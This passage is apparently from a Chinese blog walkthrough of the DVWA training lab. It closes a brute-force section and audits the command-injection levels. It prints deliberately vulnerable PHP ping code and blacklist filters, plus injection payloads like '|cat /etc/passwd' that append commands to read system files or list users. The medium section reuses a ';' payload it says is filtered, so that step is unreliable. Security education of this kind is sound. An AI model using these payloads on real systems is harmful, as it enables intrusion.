punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        <span class=\"token comment\">// 登录失败</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token comment\">// 用户反馈</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;br />&lt;br/>Alternative, the account has been locked because of too many failed logins.&lt;br />If this is the case, &lt;em>please try again in <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$lockout_time</span><span class=\"token punctuation\">&#125;</span></span> minutes&lt;/em>.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        <span class=\"token comment\">// 更新错误登录计数</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    <span class=\"token comment\">// 设置上次登录时间</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token comment\">// 生成 session token</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token function\">generateSessionToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h3 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h3>\n<p>对于暴力破解，可以通过设置 token、设定登录失败次数的阈值、设置验证码等来进行防御。</p>\n<p>对于攻击者来说，社工才是更好的选择。</p>\n<p>这个靶场主要练习了 BurpSuite 的抓包，Intruder 模块，熟练使用不同的攻击类型，以及根据情况配置不同的 payload，PHP 代码审计也至关重要，仍需继续努力...</p>\n<ul>\n<li>\n<p>Burp Suite</p>\n<ul>\n<li>proxy 模块</li>\n<li>intruder 模块\n<ul>\n<li>4 种攻击类型</li>\n<li>抓取重要响应内容配置 payload</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>暴力破解防范措施</p>\n</li>\n<li>\n<p>php 代码审计</p>\n</li>\n</ul>\n<h2 id=\"command-injection-命令注入\"><a class=\"anchor\" href=\"#command-injection-命令注入\">#</a> Command Injection 命令注入</h2>\n<h3 id=\"low级-2\"><a class=\"anchor\" href=\"#low级-2\">#</a> low 级</h3>\n<p>先进行代码审计</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Submit'</span> <span class=\"token punctuation\">]</span>  <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'ip'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// Determine OS and execute the ping command.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span> <span class=\"token function\">php_uname</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'s'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'Windows NT'</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">// Windows</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'ping  '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">// *nix</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'ping  -c 4 '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">// Feedback for the end user</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这段代码就是根据输入的 ip 地址，然后判断系统是 Linux 还是 Windows 然后对 IP 执行 ping 命令。</p>\n<p>没有对数据进行任何过滤，非常危险。</p>\n<blockquote>\n<p>[!IMPORTANT]</p>\n<p>下面符号在 Linux 和 Windows 中用法一致</p>\n<p><code>&amp;&amp;</code> ： <code>command1 &amp;&amp; command2</code> ，如果 command1 执行成功，才会执行 <code>command2</code> ，如果 <code>command2</code>  执行失败， <code>command2</code>  不执行</p>\n<p><code>&amp;</code> ： <code>command1 &amp; command2</code> ，先执行 <code>command1</code> ，再执行 <code>command2</code> ，无论 <code>command1</code>  执行是否成功， <code>command2</code>  都执行</p>\n<p><code>||</code> ： <code>command1 || command2</code> ，如果 commad1 执行成功，则 command2 不执行，只有 command1 执行失败，command2 才执行</p>\n<p><code>|</code> ：管道命令，常用作过滤，把前一个命令执行结果作为后一个命令的执行输入，例如： <code>cat /etc/passwd |grep &quot;root&quot;</code>   <code>command1 |command2</code> ：如果 command2 不需要输入，那么不管 <code>command1</code>  是什么，结果是 command2 的执行结果 `</p>\n<p><code>;</code> ： <code>command1;commadn2</code> ：按顺序执行，先执行 <code>command1</code>  再执行 <code>command2</code></p>\n</blockquote>\n<p>输入一个能 ping 的通的 ip</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">192.168</span>.222.133 <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">cat</span> /etc/passwd <span class=\"token comment\">#linux 查看所有用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">192.168</span>.222.133 <span class=\"token operator\">&amp;&amp;</span> net user        <span class=\"token comment\">#win 查看所有用户</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240517135256776-1721199923435-23.png\" alt=\"image-20240517135256776\" /></p>\n<p>输入一个 ping 不通的 IP</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">192.168</span>.199.188 <span class=\"token operator\">||</span> <span class=\"token function\">cat</span> /etc/passwd</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240517140109742-1721199923435-19.png\" alt=\"image-20240517140109742\" /></p>\n<p>随便输入一个 IP，无论是否能 ping 通</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">192.168</span>.232.123<span class=\"token punctuation\">;</span><span class=\"token function\">cat</span> /etc/passwd</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240517141420896-1721199923435-18.png\" alt=\"image-20240517141420896\" /></p>\n<h3 id=\"medium级-2\"><a class=\"anchor\" href=\"#medium级-2\">#</a> medium 级</h3>\n<p>先代码审计</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Submit'</span> <span class=\"token punctuation\">]</span>  <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'ip'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// Set blacklist</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$substitutions</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token string single-quoted-string\">'&amp;&amp;'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token string single-quoted-string\">';'</span>  <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// Remove any of the charactars in the array (blacklist).</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span> <span class=\"token function\">array_keys</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$substitutions</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$substitutions</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">// Determine OS and execute the ping command.</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span> <span class=\"token function\">php_uname</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'s'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'Windows NT'</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">// Windows</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'ping  '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token comment\">// *nix</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'ping  -c 4 '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\">// Feedback for the end user</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>相比 low 级，增加了 <code>;</code>  和 <code>&amp;&amp;</code>  过滤，但是可以用其他连接符号</p>\n<p>随便输入一个 IP，无论是否能 ping 通</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">192.168</span>.232.123<span class=\"token punctuation\">;</span><span class=\"token function\">cat</span> /etc/passwd</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240517143027045-1721199923435-20.png\" alt=\"image-20240517143027045\" /></p>\n<h3 id=\"high级-2\"><a class=\"anchor\" href=\"#high级-2\">#</a> high 级</h3>\n<p>先进行代码审计</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>if<span class=\"token punctuation\">(</span> isset<span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string\">'Submit'</span> <span class=\"token punctuation\">]</span>  <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    // Get input</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> trim<span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string\">'ip'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    // Set blacklist</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$substitutions</span> <span class=\"token operator\">=</span> array<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token string\">'&amp;'</span>  <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">''</span>,</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token string\">';'</span>  <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">''</span>,</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token string\">'| '</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">''</span>,</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token string\">'-'</span>  <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">''</span>,</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token string\">'$'</span>  <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">''</span>,</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token string\">'('</span>  <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">''</span>,</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token string\">')'</span>  <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">''</span>,</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token string\">'`'</span>  <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">''</span>,</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token string\">'||'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">''</span>,</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    // Remove any of the charactars <span class=\"token keyword\">in</span> the array <span class=\"token punctuation\">(</span>blacklist<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> str_replace<span class=\"token punctuation\">(</span> array_keys<span class=\"token punctuation\">(</span> <span class=\"token variable\">$substitutions</span> <span class=\"token punctuation\">)</span>, <span class=\"token variable\">$substitutions</span>, <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    // Determine OS and execute the <span class=\"token function\">ping</span> command.</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    if<span class=\"token punctuation\">(</span> stristr<span class=\"token punctuation\">(</span> php_uname<span class=\"token punctuation\">(</span> <span class=\"token string\">'s'</span> <span class=\"token punctuation\">)</span>, <span class=\"token string\">'Windows NT'</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        // Windows</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> shell_exec<span class=\"token punctuation\">(</span> <span class=\"token string\">'ping  '</span> <span class=\"token builtin class-name\">.</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        // *nix</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> shell_exec<span class=\"token punctuation\">(</span> <span class=\"token string\">'ping  -c 4 '</span> <span class=\"token builtin class-name\">.</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    // Feedback <span class=\"token keyword\">for</span> the end user</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"&lt;pre>&#123;<span class=\"token variable\">$cmd</span>&#125;&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>?<span class=\"token operator\">></span></pre></td></tr></table></figure><p>high 级也是加了过滤，但是对管道符的过滤还多加了空格 <code>| </code> ，对管道符的过滤是无效的</p>\n<p>随便输入一个 IP，无论能否 ping 通</p>\n<pre><code>192.168.232.123|cat /etc/passwd\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240517143909575-1721199923435-22.png\" alt=\"image-20240517143909575\" /></p>\n<h3 id=\"impossible级-2\"><a class=\"anchor\" href=\"#impossible级-2\">#</a> impossible 级</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Submit'</span> <span class=\"token punctuation\">]</span>  <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Check Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">checkToken</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'user_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'session_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'index.php'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'ip'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// Split the IP into 4 octects</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$octet</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span> <span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// Check IF each octet is an integer</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">sizeof</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$octet</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// If all 4 octets are int's put the IP 